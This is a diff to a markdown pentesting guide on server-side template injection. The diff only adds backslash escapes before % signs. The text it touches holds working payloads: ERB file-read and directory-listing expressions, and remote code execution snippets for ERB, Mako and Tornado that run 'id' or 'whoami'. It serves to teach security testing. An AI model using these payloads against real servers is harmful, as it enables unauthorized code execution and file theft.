@@ -24,8 +24,8 @@ $output = $twig->render("Dear " . $_GET['name']);
 The simplest initial approach is to try fuzzing the template by injecting a sequence of special characters commonly used in template expressions
 
 ```
-$\{\{<%[%'"\}\}%\
-<%=foo%>
+$\{\{<\%[\%'"\}\}\%\
+<\%=foo\%>
 ```
 
 > **Note**: If an exception is raised, this indicates that the injected template syntax is potentially being interpreted by the server in some way.
@@ -78,7 +78,7 @@ Once you have detected the template injection potential, the next step is to ide
 Simply submitting **invalid syntax is often enough** because the resulting **error message** will tell you exactly what the template engine is, and sometimes even which version. For example, the invalid expression:
 
 ```
-<%=foobar%>
+<\%=foobar\%>
 ```
 
 There are different **frameworks** that uses **templates**, this guide could help to identify which is and exploit them.
@@ -103,8 +103,8 @@ This can be an invaluable resource, even acting as a kind of cheat sheet for whi
 For example, in ERB, the documentation reveals that you can list all directories and then read arbitrary files as follows: 
 
 ```
-<%= Dir.entries('/') %>
-<%= File.open('/example/arbitrary-file').read %>
+<\%= Dir.entries('/') \%>
+<\%= File.open('/example/arbitrary-file').read \%>
 ```
 
 ## Look for known exploits
@@ -136,7 +136,7 @@ It is important to note that websites will contain both built-in objects provide
 ERB is a template syntax render tool for ruby.
 
 ```
-<% system("id") %>
+<\% system("id") \%>
 ```
 
 ## Mako
@@ -144,10 +144,10 @@ ERB is a template syntax render tool for ruby.
 Learning the basic syntax is obviously important, along with key functions and handling of variables. 
 
 ```
-<%
+<\%
 import os
 x=os.popen('id').read()
-%>
+\%>
 $\{x\}
 ```
 
@@ -156,7 +156,7 @@ $\{x\}
 Here we can see an RCE payload to tornado.
 
 ```
-\{% import os %\}\{\{ os.popen("whoami").read() \}\}
+\{\% import os \%\}\{\{ os.popen("whoami").read() \}\}
 ```
 
 ## Freemarker
@@ -223,4 +223,4 @@ To bypass some restrictions take a look at the following resources:
 
 * [https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
 * [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
-* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
+* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server\%20Side\%20Template\%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server\%20Side\%20Template\%20Injection#jinja2)
